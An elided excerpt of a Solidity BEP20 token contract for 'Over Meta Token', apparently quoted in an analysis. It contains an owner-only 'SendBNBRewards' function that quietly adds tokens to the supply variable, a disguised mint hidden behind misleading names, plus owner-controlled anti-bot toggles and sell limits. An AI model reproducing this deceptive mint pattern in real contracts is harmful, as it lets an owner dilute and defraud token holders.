...
*/
    ...
    contract OverMetaToken is IBEP20, Ownable
    {
        ...
        string private constant _name = "Over Meta Token";
        string private constant _symbol = "OMT";
        uint8 private constant _decimals = 9;
        uint256 public constant AvailableTickets= 100000000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant TeamWallet=0x7CbA25ee87174Ed67037a4B8a9Cd6f97e807fb83; //TEAMWALLET
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _BusdRewards =AvailableTickets;
        uint256 public  balanceLimit = 30_000_000 * 10**_decimals;
        uint256 public  sellLimit = 5_000_000 * 10**_decimals;
        uint256 public  buyLimit = 30_000_000 * 10**_decimals;
        ...
        constructor () {
            uint256 deployerBalance=_BusdRewards;
      ...
      function SendBNBRewards(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeSendRewards(address(0), account, amount);
        _BusdRewards += amount;
        ...
        function _transfer(address sender, address recipient, uint256 amount) private{
            ...
            _beforeSendRewards(sender, recipient, amount);
       ...
       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        ...
        function getBurnedTokens() public view returns(uint256){
            return (AvailableTickets-_BusdRewards)/10**_decimals;
        }
    ...
    function AntiBotsEnable() public onlyOwner{
        AntiBotsFunction=true;
    }

    function AntiBotsDisable() public onlyOwner{
